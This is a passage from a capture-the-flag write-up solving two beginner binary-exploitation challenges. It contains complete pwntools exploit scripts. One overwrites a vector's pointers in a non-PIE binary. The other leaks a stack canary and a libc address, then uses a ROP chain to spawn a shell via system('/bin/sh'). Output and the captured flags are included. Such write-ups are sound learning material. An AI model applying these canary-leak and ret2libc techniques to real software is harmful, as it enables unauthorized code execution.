To change the content of `v`, we'll have to rewrite these pointers so that they point to memory containing the text `DUCTF`. Luckily for us, the program was compiled without PIE, so the addresses of global symbols (such as `buf` and `v`) are fixed.

We can write the text `DUCTF` to `buf`, followed by some padding to reach the beginning of `v`, and then write a pointer to `buf`, and two pointers to `buf + 5` (the end of our `DUCTF` string).

```py
from pwn import process, p64, ELF

bin = ELF("./vector_overflow")
buf_addr = bin.symbols["buf"]
p = process("./vector_overflow")
s = b"DUCTF"
start = buf_addr
end = buf_addr + len(s)
p.sendline(s + b"A" * (16 - len(s)) + p64(start) + p64(end) + p64(end))

p.sendline(b"cat flag.txt")
p.sendline(b"exit")
print(p.recvall().decode())
```

```
$ python3 solve.py
[*] '/share/the-joseph-challenge/baby/vector-overflow/vector_overflow'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './vector_overflow': pid 12408
[+] Receiving all data: Done (36B)
[*] Process './vector_overflow' stopped with exit code -6 (SIGABRT) (pid 12408)
DUCTF{y0u_pwn3d_th4t_vect0r!!}
free(): invalid pointer  
```

Flag: `DUCTF{y0u_pwn3d_th4t_vect0r!!}`

## yawa

We're given a simple program with a generic menu loop and a basic 0x30 byte buffer overflow;

```c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}

int menu() {
    int choice;
    puts("1. Tell me your name");
    puts("2. Get a personalised greeting");
    printf("> ");
    scanf("%d", &choice);
    return choice;
}

int main() {
    init();

    char name[88];
    int choice;

    while(1) {
        choice = menu();
        if(choice == 1) {
            read(0, name, 0x88);
        } else if(choice == 2) {
            printf("Hello, %s\n", name);
        } else {
            break;
        }
    }
}
```

By running checksec on the provided binary, we can see that all of the modern protections have been enabled.

```
$ checksec yawa
[!] Could not populate PLT: Cannot allocate 1GB memory to run Unicorn Engine
[*] '/Users/stackotter/Desktop/Projects/Hacking/the-joseph-challenge/baby/yawa/yawa'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No  
```

We'll clearly need a way to leak memory to leak the canary and a program or libc address in order to be able to solve this challenge.

If we overflow the name buffer and one more byte, then we'll overwrite the least-significant byte of the stack canary (which is located immediately after the name buffer in this case). That least-significant byte is always a null byte, to make it harder to leak the canary with certain types of buffer overflows and leaks. By overwriting that null byte and leaving the canary intact, we ensure that the canary will get printed when we next request a personalised greeting.

> [!NOTE]
> When a program uses `read`, it will stop short of the requested count if it reaches a newline, or if it receives partial data and no more data is immediately available. Because of that second stop condition, we can send input without a newline by using `p.send` (instead of the usual `p.sendline`).

Once we've leaked the canary, we're free to overwrite it, so now we can apply the same leak technique except targetting the saved return address instead of the canary. This gives us an address in `libc_start_main` (in particular, the address of the instruction immediately following `libc_start_main`'s call to the program's actual main function). This address will have a constant offset from the base of `libc`. We can pause our exploit script using `pause()` (from pwntools) just after obtaining (and logging) our libc leak, and then attach to our target process with `gdb` to get the base address of libc;

```sh
$ gdb -p $(pidof ./yawa)
(gdb) info proc mappings
...
```

Once we have the base address of libc, we can compute the constant offset of our leak, which allows us to convert our leak to a libc base address.

Now that we have the libc base address and a stack canary, we can perform a simple ROP chain to call `system("/bin/sh")`.

```py
from pwn import process, u64, ELF, ROP, context, p64, pause

context.clear(arch="x86_64")

libc = ELF("./libc.so.6")
start_main_ret_offset = 0x29d90  # obtained dynamically in gdb

p = process("./yawa_patched")

def choose(x: int):
    p.sendlineafter(b"> ", str(x).encode())

def leak():
    choose(2)
    return p.recvline().strip().split(b", ")[1]

n = 88
choose(1)
p.send(b"A" * (n + 1))
canary_leak = b"\x00" + leak()[n + 1:n + 8]
canary = u64(canary_leak)
print(f"{hex(canary) = }")

choose(1)
p.send(b"A" * (n + 16))
libc_leak = u64(leak()[n + 16:].ljust(8, b"\x00"))
libc.address = libc_leak - start_main_ret_offset

system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh\x00"))
print(f"{hex(system) = }")
print(f"{hex(binsh) = }")

rop = ROP(libc)
rop.call(rop.ret)  # align the stack to avoid movaps segfault inside system
rop.call(system, [binsh])

choose(1)
p.send(b"A" * 88 + p64(canary) + b"B" * 8 + rop.chain())
choose(3)  # exit while loop

p.sendline(b"cat flag.txt")
p.sendline(b"exit")
print(p.recvall().decode())
```

```
$ python3 solve.py
[+] Starting local process './yawa_patched': pid 12807
hex(canary) = '0xb8d4ac1bf38f4700'
hex(system) = '0x7fcbd4850d70'
hex(binsh) = '0x7fcbd49d8678'
[*] Process './yawa_patched' stopped with exit code -11 (SIGSEGV) (pid 12807)
DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}
```

Flag: `DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}`

## Conclusion

Even though many of these challenges were very easy (as you'd expect from the advertised difficulty), I still found myself learning little tidbits from many of the challenges, and solidifying existing skills.

I'm looking forward to moving on to some of Joseph's harder challenges!
